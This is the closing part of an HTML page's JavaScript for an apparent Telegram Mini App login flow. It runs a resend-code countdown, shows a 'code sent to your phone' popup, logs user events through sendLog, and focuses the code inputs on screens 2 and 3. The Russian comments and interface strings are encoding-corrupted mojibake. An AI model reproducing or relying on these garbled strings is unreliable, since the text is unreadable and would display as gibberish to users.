      // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–π —Ç–∞–π–º–µ—Ä, –µ—Å–ª–∏ –æ–Ω –±—ã–ª
      if (resendTimerInterval) {
        clearInterval(resendTimerInterval);
      }
      
      resendTimerInterval = setInterval(() => {
        timeLeft--;
        resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
        
        if (timeLeft <= 0) {
          clearInterval(resendTimerInterval);
          resendLink.style.pointerEvents = 'auto';
          resendLink.style.color = '#007bff';
          resendTimer.style.display = 'none';
          
          // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤—Å–ø–ª—ã–≤–∞—é—â–µ–µ –æ–∫–Ω–æ
          tg.showPopup({
            title: '–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω',
            message: '–ù–æ–≤—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.',
            buttons: [{ type: 'ok' }]
          });
        }
      }, 1000);
    }

    function handleCancel() {
      sendLog('USER_CANCELLED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é');
      tg.close();
    }

    function completeAuth() {
      sendLog('AUTH_SUCCESS', '–£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è');
      nextScreen(4);
    }

    function closeWebApp() {
      sendLog('APP_CLOSED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–µ—Ä–Ω—É–ª—Å—è –≤ –±–æ—Ç–∞');
      tg.close();
    }

    document.addEventListener('DOMContentLoaded', function() {
      sendLog('APP_STARTED', '–ú–∏–Ω–∏-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ –≤ Telegram WebView');
      
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            if (document.getElementById('screen2').classList.contains('active')) {
              document.querySelector('#screen2 .code-input').focus();
            }
            if (document.getElementById('screen3').classList.contains('active')) {
              document.querySelector('#screen3 .code-input').focus();
            }
          }
        });
      });
      
      observer.observe(document.getElementById('screen2'), { attributes: true });
      observer.observe(document.getElementById('screen3'), { attributes: true });
    });
  </script>
</body>
</html>